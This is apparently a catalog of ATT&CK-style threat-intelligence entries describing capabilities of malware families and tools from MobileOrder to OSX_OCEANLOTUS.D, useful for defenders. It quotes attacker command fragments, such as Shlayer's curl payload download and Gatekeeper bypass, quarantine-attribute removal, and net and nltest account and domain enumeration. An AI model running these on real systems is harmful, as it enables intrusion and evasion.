MobileOrder has a command to upload to its C2 server information about files on the victim mobile device, including SD card size, installed app list, SMS content, contacts, and calling history.
MobileOrder has a command to download a file from the C2 server to the victim mobile device's SD card.
MobileOrder has a command to upload information about all running processes to its C2 server.
MobileOrder has a command to upload to its C2 server victim mobile device information, including IMEI, IMSI, SIM card serial number, phone number, Android version, and other information.
MoleNet can download additional payloads from the C2.
MoleNet can use PowerShell to set persistence.
MoleNet can achieve persitence on the infected machine by setting the Registry run key.
MoleNet can use WMI commands to check the system for firewall and antivirus software.
MoleNet can collect information about the about the system.
MoleNet can execute commands via the command line utility.
MoleNet can perform WMI commands on the system.
Mongall has the ability to upload files from victim's machines.
Mongall has the ability to decrypt its payload prior to execution.
Mongall can inject a DLL into `rundll32.exe` for execution.
Mongall can upload files and information from a compromised host to its C2 server.
Mongall can download files to targeted systems.
Mongall has relied on a user opening a malicious document for execution.
Mongall can identify removable media attached to compromised hosts.
Mongall can establish persistence with the auto start function including using the value `EverNoteTrayUService`.
Mongall can use `rundll32.exe` for execution.
Mongall has been packed with Themida.
Mongall can use Base64 to encode information sent to its C2.
Mongall has the ability to RC4 encrypt C2 communications.
Mongall can identify drives on compromised hosts and retrieve the hostname via `gethostbyname`.
Mongall can use HTTP for C2 communication.
MoonWind can delete itself or specified files.
MoonWind has a command to return a directory listing for a specified directory.
MoonWind has a keylogger.
MoonWind saves information from its keylogging routine as a .zip file in the present working directory.
MoonWind completes network communication via raw sockets.
MoonWind communicates over ports 80, 443, 53, and 8080 via raw sockets instead of the protocols usually associated with the ports.
MoonWind obtains the number of removable drives from the victim.
MoonWind has a command to return a list of running processes.
MoonWind encrypts C2 traffic using RC4 with a static key.
MoonWind can obtain the victim hostname, Windows version, RAM amount, number of drives, and screen resolution.
MoonWind obtains the victim IP address.
MoonWind obtains the victim username.
MoonWind obtains the victim's current time.
MoonWind can execute commands via an interactive command shell. MoonWind uses batch scripts for various purposes, including to restart and uninstall itself.
MoonWind installs itself as a new service with automatic startup to establish persistence. The service checks every 60 seconds to determine if the malware is running; if not, it will spawn a new instance.
More_eggs has used a signed binary shellcode loader and a signed Dynamic Link Library (DLL) to create a reverse shell.
More_eggs will decode malware components that are then dropped to the system.
More_eggs's payload has been encrypted with a key that has the hostname and processor family information appended to the end.
More_eggs can remove itself from a system.
More_eggs can download and launch additional payloads.
More_eggs has used HTTP GET requests to check internet connectivity.
More_eggs has used regsvr32.exe to execute the malicious DLL.
More_eggs can obtain information on installed anti-malware programs.
More_eggs has used basE91 encoding, along with encryption, for C2 communication.
More_eggs has used an RC4-based encryption method for its C2 communications.
More_eggs has the capability to gather the OS version and computer name.
More_eggs has the capability to gather the IP address from the victim's machine.
More_eggs has the capability to gather the username from the victim's machine.
More_eggs uses HTTPS for C2.
More_eggs has used cmd.exe for execution.
Mori can use DNS tunneling to communicate with C2.
Mori can resolve networking APIs from strings that are ADD-encrypted.
Mori can delete its DLL file and related files by Registry value.
Mori has obfuscated the FML.dll with 200MB of junk data.
Mori can write data to `HKLM\Software\NFC\IPA` and `HKLM\Software\NFC\` and delete Registry values.
Mori can read data from the Registry including from `HKLM\Software\NFC\IPA` and
`HKLM\Software\NFC\`.
Mori can use `regsvr32.exe` for DLL execution.
Mori can use Base64 encoded JSON libraries used in C2.
Mori can communicate using HTTP over IPv4 or IPv6 depending on a flag set.
Mosquito uses COM hijacking as a method of persistence.
Mosquito’s installer is obfuscated with a custom crypter to obfuscate the installer.
Mosquito deletes files using DeleteFileW API call.
Mosquito stores configuration values under the Registry key &lt;code&gt;HKCU\Software\Microsoft\[dllname]&lt;/code&gt;.
Mosquito can upload and download files to the victim.
Mosquito can modify Registry keys under &lt;code&gt;HKCU\Software\Microsoft\[dllname]&lt;/code&gt; to store configuration values. Mosquito also modifies Registry keys under &lt;code&gt;HKCR\CLSID\...\InprocServer32&lt;/code&gt; with a path to the launcher.
Mosquito leverages the CreateProcess() and LoadLibrary() calls to execute files with the .dll and .exe extensions.
Mosquito can launch PowerShell Scripts.
Mosquito runs &lt;code&gt;tasklist&lt;/code&gt; to obtain running processes.
Mosquito establishes persistence under the Registry key &lt;code&gt;HKCU\Software\Run auto_update&lt;/code&gt;.
Mosquito's launcher uses rundll32.exe in a Registry Key value to start the main backdoor capability.
Mosquito's installer searches the Registry and system to see if specific antivirus tools are installed on the system.
Mosquito uses a custom encryption algorithm, which consists of XOR and a stream that is similar to the Blum Blum Shub algorithm.
Mosquito uses the &lt;code&gt;ipconfig&lt;/code&gt; command.
Mosquito runs &lt;code&gt;whoami&lt;/code&gt; on the victim’s machine.
Mosquito executes cmd.exe and uses a pipe to read the results and send back the output to the C2 server.
Mosquito's installer uses WMI to search for antivirus display names.
Mythic supports SSL encrypted C2.
Mythic supports scripting of file downloads from agents.
Mythic supports DNS-based C2 profiles.
Mythic provides various transform functions to encode and/or randomize C2 data.
Mythic supports custom chunk sizes used to upload/download files.
Mythic supports domain fronting via custom request headers.
Mythic can leverage a modified SOCKS5 proxy to tunnel egress C2 traffic.
Mythic can use a list of C2 URLs as fallback mechanisms in case one IP or domain gets blocked.
Mythic supports SMB-based peer-to-peer C2 profiles.
Mythic can leverage a peer-to-peer C2 profile between agents.
Mythic supports WebSocket and TCP-based C2 profiles.
Mythic can use SOCKS proxies to tunnel traffic through another protocol.
Mythic supports HTTP-based C2 profiles.
NBTscan can be used to scan IP networks.
NBTscan can dump and print whole packet content.
NBTscan can list NetBIOS computer names.
NBTscan can be used to collect MAC addresses.
NBTscan can list active users on the system.
NDiskMonitor can obtain a list of all files and directories as well as logical drives.
NDiskMonitor can download and execute a file from given URL.
NDiskMonitor uses AES to encrypt certain information sent over its C2 channel.
NDiskMonitor obtains the victim computer name and encrypts the information to send over its C2 channel.
NDiskMonitor obtains the victim username and encrypts the information to send over its C2 channel.
Adversaries can also use NETEAGLE to establish an RDP connection with a controller over TCP/7519.
NETEAGLE can use HTTP to download resources that contain an IP address and port number pair to connect to for C2.
NETEAGLE is capable of reading files over the C2 channel.
NETEAGLE will attempt to detect if the infected host is configured to a proxy. If so, NETEAGLE will send beacons via an HTTP POST request; otherwise it will send beacons via UDP/6000.
NETEAGLE allows adversaries to enumerate and modify the infected host's file system. It supports searching for directories, creating directories, listing directory contents, reading and writing to files, retrieving file attributes, and retrieving volume information.
If NETEAGLE does not detect a proxy configured on the infected machine, it will send beacons via UDP/6000. Also, after retrieving a C2 IP address and Port Number, NETEAGLE will initiate a TCP connection to this socket. The ensuing connection is a plaintext C2 channel in which commands are specified by DWORDs.
NETEAGLE can send process listings over the C2 channel.
The "SCOUT" variant of NETEAGLE achieves persistence by adding itself to the &lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; Registry key.
NETEAGLE will decrypt resources it downloads with HTTP requests by using RC4 with the key "ScoutEagle."
NETEAGLE will attempt to detect if the infected host is configured to a proxy. If so, NETEAGLE will send beacons via an HTTP POST request. NETEAGLE will also use HTTP to download resources that contain an IP address and Port Number pair to connect to for further C2.
NETEAGLE allows adversaries to execute shell commands on the infected host.
NETWIRE can discover and close windows on controlled systems.
NETWIRE has the ability to compress archived screenshots.
NETWIRE has used a custom encryption algorithm to encrypt collected data.
NETWIRE can automatically archive collected data.
NETWIRE can retrieve passwords from messaging and mail client applications.
NETWIRE has the ability to steal credentials from web browsers including Internet Explorer, Opera, Yandex, and Chrome.
NETWIRE can use crontabs to establish persistence.
NETWIRE can encrypt C2 communications.
NETWIRE has the ability to search for files on the compromised host.
NETWIRE can store its configuration information in the Registry under `HKCU:\Software\Netwire`.
NETWIRE can copy itself to and launch itself from hidden folders.
NETWIRE can downloaded payloads from C2 to the compromised host.
The NETWIRE client has been signed by fake and invalid digital certificates.
NETWIRE can perform keylogging.
NETWIRE can use launch agents for persistence.
NETWIRE has the ability to write collected data to a file created in the &lt;code&gt;./LOGS&lt;/code&gt; directory.
NETWIRE can persist via startup options for Login items.
NETWIRE has been executed through luring victims into opening malicious documents.
NETWIRE has been executed through convincing victims into clicking malicious links.
NETWIRE has masqueraded as legitimate software including TeamViewer and macOS Finder.
NETWIRE can modify the Registry to store its configuration information.
NETWIRE can use Native API including &lt;code&gt;CreateProcess&lt;/code&gt; &lt;code&gt;GetProcessById&lt;/code&gt;, and &lt;code&gt;WriteProcessMemory&lt;/code&gt;.
NETWIRE can use TCP in C2 communications.
NETWIRE has used a custom obfuscation algorithm to hide strings including Registry keys, APIs, and DLL names.
The NETWIRE binary has been executed via PowerShell script.
NETWIRE can discover processes on compromised hosts.
The NETWIRE payload has been injected into benign Microsoft executables via process hollowing.
NETWIRE can inject code into system processes including notepad.exe, svchost.exe, and vbc.exe.
NETWIRE can implement use of proxies to pivot traffic.
NETWIRE creates a Registry start-up entry to establish persistence.
NETWIRE can create a scheduled task to establish persistence.
NETWIRE can capture the victim's screen.
NETWIRE has used .NET packer tools to evade detection.
NETWIRE has been spread via e-mail campaigns utilizing malicious attachments.
NETWIRE has been spread via e-mail campaigns utilizing malicious links.
NETWIRE can use AES encryption for C2 data transferred.
NETWIRE can discover and collect victim system information.
NETWIRE can collect the IP address of a compromised host.
NETWIRE can capture session logon details from a compromised host.
NETWIRE has the ability to use &lt;code&gt;/bin/bash&lt;/code&gt; and &lt;code&gt;/bin/sh&lt;/code&gt; to execute commands.
NETWIRE has been executed through use of VBScripts.
NETWIRE has the ability to communicate over HTTP.
NETWIRE has used web services including Paste.ee to host payloads.
NETWIRE can issue commands using cmd.exe.
NETWIRE can use XDG Autostart Entries to establish persistence on Linux systems.
NGLite has abused NKN infrastructure for its C2 communication.
NGLite will use an AES encrypted channel for command and control purposes, in one case using the key &lt;code&gt;WHATswrongwithUu&lt;/code&gt;.
NGLite identifies the victim system MAC and IPv4 addresses and uses these to establish a victim identifier.
NGLite will run the &lt;code&gt;whoami&lt;/code&gt; command to gather system information and return this to the command and control server.
NGLite will initially beacon out to the NKN network via an HTTP POST over TCP 30003.
NKAbuse uses a Cron job to establish persistence when infecting Linux hosts.
NKAbuse utilizes external services such as &lt;code&gt;ifconfig.me&lt;/code&gt; to identify the victim machine's IP address.
NKAbuse has abused the NKN public blockchain protocol for its C2 communications.
NKAbuse enables multiple types of network denial of service capabilities across several protocols post-installation.
NKAbuse will check victim systems to ensure only one copy of the malware is running.
NKAbuse can take screenshots of the victim machine.
NKAbuse conducts multiple system checks and includes these in subsequent "heartbeat" messages to the malware's command and control server.
NKAbuse is initially installed and executed through an initial shell script.
NOKKI uses the Windows call SetWindowsHookEx and begins injecting it into every GUI process running on the victim's machine.
NOKKI uses a unique, custom de-obfuscation technique.
NOKKI can delete files to cover tracks.
NOKKI has used FTP for C2 communications.
NOKKI has downloaded a remote module for execution.
NOKKI can collect data from the victim and stage it in &lt;code&gt;LOCALAPPDATA%\MicroSoft Updatea\uplog.tmp&lt;/code&gt;.
NOKKI is written to %LOCALAPPDATA%\MicroSoft Updatea\svServiceUpdate.exe prior being executed in a new process in an apparent attempt to masquerade as a legitimate folder and file.
NOKKI uses Base64 encoding for strings.
NOKKI has established persistence by writing the payload to the Registry key &lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt;.
NOKKI has used rundll32 for execution.
NOKKI can gather information on drives and the operating system on the victim’s machine.
NOKKI can gather information on the victim IP address.
NOKKI can collect the username from the victim’s machine.
NOKKI can collect the current timestamp of the victim's machine.
NOKKI has used HTTP for C2 communications.
Naid creates Registry entries that store information about a created service and point to a malicious DLL dropped to disk.
Naid collects a unique identifier (UID) from a compromised host.
Naid collects the domain name from a compromised host.
Naid creates a new service to establish.
NanHaiShu uses DNS for the C2 communications.
NanHaiShu can change Internet Explorer settings to reduce warnings about malware activity.
NanHaiShu encodes files in Base64.
NanHaiShu launches a script to delete their original decoy file to cover tracks.
NanHaiShu can download additional files from URLs.
NanHaiShu executes additional Jscript code on the victim's machine.
NanHaiShu uses mshta.exe to load its program and files.
NanHaiShu modifies the %regrun% Registry to point itself to an autostart mechanism.
NanHaiShu can gather the victim computer name and serial number.
NanHaiShu can gather information about the victim proxy server.
NanHaiShu collects the username from the victim.
NanHaiShu executes additional VBScript code on the victim's machine.
NanoCore can capture audio feeds from the system.
NanoCore can modify the victim's firewall.
NanoCore can modify the victim's anti-virus.
NanoCore has the capability to download and activate additional modules for execution.
NanoCore can perform keylogging on the victim’s machine.
NanoCore has the capability to edit the Registry.
NanoCore’s plugins were obfuscated with Eazfuscater.NET 3.3.
NanoCore creates a RunOnce key in the Registry to execute its VBS scripts each time the user logs on to the machine.
NanoCore uses DES to encrypt the C2 traffic.
NanoCore gathers the IP address from the victim’s machine.
NanoCore can access the victim's webcam and capture data.
NanoCore uses VBS files.
NanoCore can open a remote command-line interface and execute commands. NanoCore uses JavaScript files.
NativeZone can decrypt and decode embedded  Cobalt Strike beacon stage shellcode.
NativeZone can check for the presence of KM.EkeyAlmaz1C.dll and will halt execution unless it is in the same directory as the rest of the malware's components.
NativeZone can display an RTF document to the user  to enable execution of  Cobalt Strike stage shellcode.
NativeZone has, upon execution, displayed a message box that appears to be related to a Ukrainian electronic document management system.
NativeZone has used rundll32 to execute a malicious DLL.
NativeZone has checked if Vmware or VirtualBox VM is running on a compromised host.
NavRAT can download files remotely.
NavRAT logs the keystrokes on the targeted system.
NavRAT writes multiple outputs to a TMP file using the &gt;&gt; method.
NavRAT uses the email platform, Naver, for C2 communications, leveraging SMTP.
NavRAT uses &lt;code&gt;tasklist /v&lt;/code&gt; to check running processes.
NavRAT copies itself into a running Internet Explorer process to evade detection.
NavRAT creates a Registry key to ensure a file gets executed upon reboot in order to establish persistence.
NavRAT uses &lt;code&gt;systeminfo&lt;/code&gt; on a victim’s machine.
NavRAT leverages cmd.exe to perform discovery techniques. NavRAT loads malicious shellcode and executes it in memory.
Nebulae can use DLL side-loading to gain execution.
Nebulae has the capability to upload collected files to C2.
Nebulae has the ability to delete files and directories.
Nebulae can list files and directories on a compromised host.
Nebulae can download files from C2.
Nebulae has created a service named "Windows Update Agent1" to appear legitimate.
Nebulae uses functions named &lt;code&gt;StartUserModeBrowserInjection&lt;/code&gt; and &lt;code&gt;StopUserModeBrowserInjection&lt;/code&gt; indicating that it's trying to imitate chrome_frame_helper.dll.
Nebulae has the ability to use &lt;code&gt;CreateProcess&lt;/code&gt; to execute a process.
Nebulae can use TCP in C2 communications.
Nebulae can enumerate processes on a target system.
Nebulae can achieve persistence through a Registry Run key.
Nebulae can use RC4 and XOR to encrypt C2 communications.
Nebulae can discover logical drive information including the drive type, free space, and volume information.
Nebulae can use CMD to execute a process.
Nebulae can create a service to establish persistence.
Neoichor can use the Internet Explorer (IE) COM interface to connect and receive commands from C2.
Neoichor can upload files from a victim's machine.
Neoichor can clear the browser history on a compromised host by changing the `ClearBrowsingHistoryOnExit` value to 1 in the `HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Privacy` Registry key.
Neoichor can download additional files onto a compromised host.
Neoichor can check for Internet connectivity by contacting bing[.]com with the request format `bing[.]com?id=&lt;GetTickCount&gt;`.
Neoichor has the ability to configure browser settings by modifying Registry entries under `HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer`.
Neoichor can collect the OS version and computer name from a compromised host.
Neoichor can identify the system language on a compromised host.
Neoichor can gather the IP address from an infected host.
Neoichor can collect the user name from a victim's machine.
Neoichor can use HTTP for C2 communications.
Nerex drops a signed Microsoft DLL to disk.
Nerex creates a backdoor through which remote attackers can download files onto a compromised host.
Nerex creates a Registry subkey that registers a new service.
Nerex creates a Registry subkey that registers a new service.
Net commands used with the &lt;code&gt;/domain&lt;/code&gt; flag can be used to gather information about and manipulate user accounts on the current domain.
The &lt;code&gt;net user username \password \domain&lt;/code&gt; commands in Net can be used to create a domain account.
Commands such as &lt;code&gt;net group /domain&lt;/code&gt; can be used in Net to gather information about and manipulate groups.
Commands under &lt;code&gt;net user&lt;/code&gt; can be used in Net to gather information about and manipulate user accounts.
The &lt;code&gt;net user username \password&lt;/code&gt; commands in Net can be used to create a local account.
Commands such as &lt;code&gt;net group&lt;/code&gt; and &lt;code&gt;net localgroup&lt;/code&gt; can be used in Net to gather information about and manipulate groups.
The &lt;code&gt;net use \\system\share /delete&lt;/code&gt; command can be used in Net to remove an established connection to a network share.
The &lt;code&gt;net view \\remotesystem&lt;/code&gt; and &lt;code&gt;net share&lt;/code&gt; commands in Net can be used to find shared drives and directories on remote and local systems respectively.
The &lt;code&gt;net accounts&lt;/code&gt; and &lt;code&gt;net accounts /domain&lt;/code&gt; commands with Net can be used to obtain password policy information.
Commands such as &lt;code&gt;net view&lt;/code&gt; can be used in Net to gather information about available remote systems.
Lateral movement can be done with Net through &lt;code&gt;net use&lt;/code&gt; commands to connect to the on remote systems.
The &lt;code&gt;net start&lt;/code&gt; and &lt;code&gt;net stop&lt;/code&gt; commands can be used in Net to execute or stop Windows services.
Commands such as &lt;code&gt;net use&lt;/code&gt; and &lt;code&gt;net session&lt;/code&gt; can be used in Net to gather information about network connections from a particular host.
The &lt;code&gt;net start&lt;/code&gt; command can be used in Net to find information about Windows services.
The &lt;code&gt;net time&lt;/code&gt; command can be used in Net to determine the local or remote system time.
Net Crawler uses credential dumpers such as Mimikatz and Windows Credential Editor to extract cached credentials from Windows systems.
Net Crawler uses a list of known credentials gathered through credential dumping to guess passwords to accounts as it spreads throughout a network.
Net Crawler uses Windows admin shares to establish authenticated sessions to remote systems over SMB as part of lateral movement.
Net Crawler uses PsExec to perform remote service manipulation to execute a copy of itself as part of lateral movement.
NetTraveler reports window names along with keylogger information to provide application context.
NetTraveler contains a keylogger.
Netwalker's PowerShell script has been obfuscated with multiple layers including base64 and hexadecimal encoding and XOR-encryption, as well as obfuscated PowerShell functions and variables.
Netwalker can encrypt files on infected machines to extort victims.
Netwalker's PowerShell script can decode and decrypt multiple layers of obfuscation, leading to the Netwalker DLL being loaded into memory.
Netwalker can detect and terminate active security software-related processes on infected systems.
The Netwalker DLL has been injected reflectively into the memory of a legitimate running process.
Netwalker's DLL has been embedded within the PowerShell script in hex format.
Operators deploying Netwalker have used psexec and certutil to retrieve the Netwalker payload.
Netwalker can delete the infected system's Shadow Volumes to prevent recovery.
Operators deploying Netwalker have used psexec to copy the Netwalker payload across accessible systems.
Netwalker can add the following registry entry: &lt;code&gt;HKEY_CURRENT_USER\SOFTWARE\{8 random characters}&lt;/code&gt;.
Netwalker can use Windows API functions to inject the ransomware DLL.
Netwalker has been written in PowerShell and executed directly in memory, avoiding detection.
Netwalker can detect and terminate active security software-related processes on infected systems.
Operators deploying Netwalker have used psexec and certutil to retrieve the Netwalker payload.
Netwalker can terminate system processes and services, some of which relate to backup software.
Netwalker can determine the system architecture it is running on to choose which version of the DLL to use.
Operators deploying Netwalker have used batch scripts to retrieve the Netwalker payload.
Netwalker can use WMI to delete Shadow Volumes.
Nidiran can download and execute files.
Nidiran can create a new service named msamger (Microsoft Security Accounts Manager), which mimics the legitimate Microsoft database by the same name.
Nidiran can create a new service named msamger (Microsoft Security Accounts Manager).
NightClub can use `GetForegroundWindow` to enumerate the active window.
NightClub can load a module to leverage the LAME encoder and `mciSendStringW` to control and capture audio.
NightClub can use a DNS tunneling plugin to exfiltrate data by adding it to the subdomain portion of a DNS request.
NightClub can use a file monitor to steal specific files from targeted systems.
NightClub can use SMTP and DNS for file exfiltration and C2.
NightClub can use a file monitor to identify .lnk, .doc, .docx, .xls, .xslx, and .pdf files.
NightClub can load multiple additional plugins on an infected host.
NightClub can use a plugin for keylogging.
NightClub has copied captured files and keystrokes to the `%TEMP%` directory of compromised hosts.
NightClub can use emails for C2 communications.
NightClub has created a service named `WmdmPmSp` to spoof a Windows Media service.
NightClub has chosen file names to appear legitimate including EsetUpdate-0117583943.exe for its dropper.
NightClub can modify the Registry to set the ServiceDLL for a service created by the malware for persistence.
NightClub can use multiple native APIs including `GetKeyState`, `GetForegroundWindow`, `GetWindowThreadProcessId`, and `GetKeyboardLayout`.
NightClub has used a non-standard encoding in DNS tunneling removing any `=` from the result of base64 encoding, and replacing `/` characters with `-s` and `+` characters with `-p`.
NightClub can obfuscate strings using the congruential generator `(LCG): staten+1 = (690069 × staten + 1) mod 232`.
NightClub has the ability to monitor removable drives.
NightClub has the ability to use `GetWindowThreadProcessId` to identify the process behind a specified window.
NightClub can load a module to call `CreateCompatibleDC` and `GdipSaveImageToStream` for screen capture.
NightClub can modify the Creation, Access, and Write timestamps for malicious DLLs to match those of the genuine Windows DLL user32.dll.
NightClub has created a Windows service named `WmdmPmSp` to establish persistence.
Ninja loaders can be side-loaded with legitimate and signed executables including the  VLC.exe media player.
Ninja has the ability to modify headers and URL paths to hide malicious traffic in HTTP requests.
The Ninja loader component can decrypt and decompress the payload.
The Ninja payload is XOR encrypted and compressed. Ninja has also XORed its configuration data with a constant value of `0xAA` and compressed it with the LZSS algorithm.
Ninja can store its final payload in the Registry under `$HKLM\SOFTWARE\Classes\Interface\` encrypted with a dynamically generated key based on the drive’s serial number.
Ninja has the ability to enumerate directory content.
Ninja can use pipes to redirect the standard input and the standard output.
Ninja can proxy C2 communications including to and from internal agents without internet connectivity.
Ninja has gained execution through victims opening malicious executable files embedded in zip archives.
Ninja has used legitimate looking filenames for its loader including update.dll and x64.dll.
Ninja has the ability to use a proxy chain with up to 255 hops when using TCP.
The Ninja loader can call Windows APIs for discovery, process injection, and payload decryption.
Ninja can forward TCP packets between the C2 and a remote host.
Ninja can encode C2 communications with a base64 algorithm using a custom alphabet.
Ninja can enumerate processes on a targeted host.
Ninja has the ability to inject an agent module into a new process and arbitrary shellcode into running processes.
Ninja has the ability to mimic legitimate services with customized HTTP URL paths and headers to hide malicious traffic.
Ninja loader components can be executed through rundll32.exe.
Ninja can configure its agent to work only in specific time frames.
Ninja has been distributed to victims via the messaging app Telegram.
Ninja can XOR and AES encrypt C2 messages.
Ninja can obtain the computer name and information on the OS and physical drives from targeted hosts.
Ninja can enumerate the IP address on compromised systems.
Ninja can change or create the last access or write times.
Ninja can use HTTP for C2 communications.
Ninja can create the services `httpsvc` and `w3esvc` for persistence .
Nltest may be used to enumerate trusted domains by using commands such as &lt;code&gt;nltest /domain_trusts&lt;/code&gt;.
Nltest may be used to enumerate remote domain controllers using options such as &lt;code&gt;/dclist&lt;/code&gt; and &lt;code&gt;/dsgetdc&lt;/code&gt;.
Nltest may be used to enumerate the parent domain of a local machine using &lt;code&gt;/parentdomain&lt;/code&gt;.
NotPetya uses &lt;code&gt;wevtutil&lt;/code&gt; to clear the Windows event logs.
NotPetya encrypts user files and disk structures like the MBR with 2048-bit RSA.
NotPetya can use two exploits in SMBv1, EternalBlue and EternalRomance, to spread itself to other remote systems on the network.
NotPetya searches for files ending with dozens of different file extensions prior to encryption.
NotPetya contains a modified version of Mimikatz to help gather credentials that are later used for lateral movement.
NotPetya can use valid credentials with PsExec or &lt;code&gt;wmic&lt;/code&gt; to spread itself to remote systems.
NotPetya drops PsExec with the filename dllhost.dat.
NotPetya uses &lt;code&gt;rundll32.exe&lt;/code&gt; to install itself on remote systems when accessed via PsExec or &lt;code&gt;wmic&lt;/code&gt;.
NotPetya can use PsExec, which interacts with the &lt;code&gt;ADMIN$&lt;/code&gt; network share to execute commands on remote systems.
NotPetya creates a task to reboot the system one hour after infection.
NotPetya determines if specific antivirus programs are running on an infected host machine.
NotPetya can use PsExec to help propagate itself across a network.
NotPetya will reboot the system one hour after infection.
NotPetya can use &lt;code&gt;wmic&lt;/code&gt; to help propagate itself across a network.
OLDBAIT collects credentials from several email clients.
OLDBAIT collects credentials from Internet Explorer, Mozilla Firefox, and Eudora.
OLDBAIT can use SMTP for C2.
OLDBAIT installs itself in &lt;code&gt;%ALLUSERPROFILE%\\Application Data\Microsoft\MediaPlayer\updatewindws.exe&lt;/code&gt;; the directory name is missing a space and the file name is missing the letter "o."
OLDBAIT obfuscates internal strings and unpacks them at startup.
OLDBAIT can use HTTP for C2.
OSInfo enumerates local and domain users
OSInfo specifically looks for Domain Admins and power users within the domain.
OSInfo enumerates local and domain users
OSInfo has enumerated the local administrators group.
OSInfo discovers shares on the network
OSInfo queries the registry to look for information about Terminal Services.
OSInfo performs a connection test to discover remote systems in the network
OSInfo discovers information about the infected machine.
OSInfo discovers the current domain information.
OSInfo enumerates the current network connections similar to &lt;code&gt; net use &lt;/code&gt;.
OSX/Shlayer can install malicious Safari browser extensions to serve ads.
OSX/Shlayer can base64-decode and AES-decrypt downloaded payloads. Versions of OSX/Shlayer pass encrypted and password-protected code to &lt;code&gt;openssl&lt;/code&gt; and then write the payload to the &lt;code&gt;/tmp&lt;/code&gt; folder.
OSX/Shlayer can escalate privileges to root by asking the user for credentials.
OSX/Shlayer has used the command &lt;code&gt;appDir="$(dirname $(dirname "$currentDir"))"&lt;/code&gt; and &lt;code&gt;$(dirname "$(pwd -P)")&lt;/code&gt; to construct installation paths.
If running with elevated privileges, OSX/Shlayer has used the &lt;code&gt;spctl&lt;/code&gt; command to disable Gatekeeper protection for a downloaded file. OSX/Shlayer can also leverage system links pointing to bash scripts in the downloaded DMG file to bypass Gatekeeper, a flaw patched in macOS 11.3 and later versions. OSX/Shlayer has been Notarized by Apple, resulting in successful passing of additional Gatekeeper checks.
OSX/Shlayer has executed a .command script from a hidden directory in a mounted DMG.
OSX/Shlayer has used the &lt;code&gt;mktemp&lt;/code&gt; utility to make random and unique filenames for payloads, such as &lt;code&gt;export tmpDir="$(mktemp -d /tmp/XXXXXXXXXXXX)"&lt;/code&gt; or &lt;code&gt;mktemp -t Installer&lt;/code&gt;.
OSX/Shlayer has used the `nohup` command to instruct executed payloads to ignore hangup signals.
OSX/Shlayer can download payloads, and extract bytes from files. OSX/Shlayer uses the &lt;code&gt;curl -fsL "$url" &gt;$tmp_path&lt;/code&gt; command to download malicious payloads into a temporary directory.
OSX/Shlayer can use the &lt;code&gt;chmod&lt;/code&gt; utility to set a file as executable, such as &lt;code&gt;chmod 777&lt;/code&gt; or &lt;code&gt;chmod +x&lt;/code&gt;.
OSX/Shlayer has relied on users mounting and executing a malicious DMG file.
OSX/Shlayer can masquerade as a Flash Player update.
OSX/Shlayer has used a resource fork to hide a compressed binary file of itself from the terminal, Finder, and potentially evade traditional scanners.
OSX/Shlayer has collected the IOPlatformUUID, session UID, and the OS version using the command &lt;code&gt;sw_vers -productVersion&lt;/code&gt;.
OSX/Shlayer can use bash scripts to check the macOS version, download payloads, and extract bytes from files. OSX/Shlayer uses the command &lt;code&gt;sh -c tail -c +1381...&lt;/code&gt; to extract bytes at an offset from a specified file. OSX/Shlayer uses the &lt;code&gt;curl -fsL "$url" &gt;$tmp_path&lt;/code&gt; command to download malicious payloads into a temporary directory.
OSX_OCEANLOTUS.D has used AES in CBC mode to encrypt collected data when saving that data to disk.
OSX_OCEANLOTUS.D scrambles and encrypts data using AES256 before sending it to the C2 server.
OSX_OCEANLOTUS.D has the ability to upload files from a compromised host.
OSX_OCEANLOTUS.D uses a decode routine combining bit shifting and XOR operations with a variable key that depends on the length of the string that was encoded. If the computation for the variable XOR key turns out to be 0, the default XOR key of 0x1B is used. This routine is also referenced as the `rotate` function in reporting.
OSX_OCEANLOTUS.D encrypts its strings in RSA256 and encodes them in a custom base64 scheme and XOR.
OSX_OCEANLOTUS.D has a command to delete a file from the system. OSX_OCEANLOTUS.D deletes the app bundle and dropper after execution.
OSX_OCEANLOTUS.D uses the command &lt;code&gt;xattr -d com.apple.quarantine&lt;/code&gt; to remove the quarantine file attribute used by Gatekeeper.
OSX_OCEANLOTUS.D sets the main loader file’s attributes to hidden.
OSX_OCEANLOTUS.D has a command to download and execute a file on the victim’s machine.
OSX_OCEANLOTUS.D can create a persistence file in the folder &lt;code&gt;/Library/LaunchAgents&lt;/code&gt;.
If running with &lt;code&gt;root&lt;/code&gt; permissions, OSX_OCEANLOTUS.D can create a persistence file in the folder &lt;code&gt;/Library/LaunchDaemons&lt;/code&gt;.
OSX_OCEANLOTUS.D has changed permissions of a second-stage payload to an executable via &lt;code&gt;chmod&lt;/code&gt;.
OSX_OCEANLOTUS.D has disguised it's true file structure as an application bundle by adding special characters to the filename and using the icon for legitimate Word documents.
OSX_OCEANLOTUS.D uses file naming conventions with associated executable locations to blend in with the macOS TimeMachine and OpenSSL services. Such as, naming a LaunchAgent plist file `com.apple.openssl.plist` which executes OSX_OCEANLOTUS.D from the user's `~/Library/OpenSSL/` folder upon user login.
OSX_OCEANLOTUS.D has used a custom binary protocol over port 443 for C2 traffic.
OSX_OCEANLOTUS.D has used a custom binary protocol over TCP port 443 for C2.
OSX_OCEANLOTUS.D uses PowerShell scripts.
For network communications, OSX_OCEANLOTUS.D loads a dynamic library (`.dylib` file) using `dlopen()` and obtains a function pointer to execute within that shared library using `dlsym()`.
OSX_OCEANLOTUS.D has a variant that is packed with UPX.
OSX_OCEANLOTUS.D has used `zlib` to compress all data after 0x52 for the custom TCP C2 protocol.
OSX_OCEANLOTUS.D encrypts data sent back to the C2 using AES in CBC mode with a null initialization vector (IV) and a key sent from the server that is padded to 32 bytes.
OSX_OCEANLOTUS.D checks a number of system parameters to see if it is being run on real hardware or in a virtual machine environment, such as `sysctl hw.model` and the kernel boot time.
OSX_OCEANLOTUS.D collects processor information, memory information, computer name, hardware UUID, serial number, and operating system version. OSX_OCEANLOTUS.D has used the &lt;code&gt;ioreg&lt;/code&gt; command to gather some of this information.
OSX_OCEANLOTUS.D can collect the network interface MAC address on the infected host.
OSX_OCEANLOTUS.D can use the &lt;code&gt;touch -t&lt;/code&gt; command to change timestamps.
OSX_OCEANLOTUS.D uses a shell script as the main executable inside an app bundle and drops an embedded base64-encoded payload to the &lt;code&gt;/tmp&lt;/code&gt; folder.
OSX_OCEANLOTUS.D uses Word macros for execution.
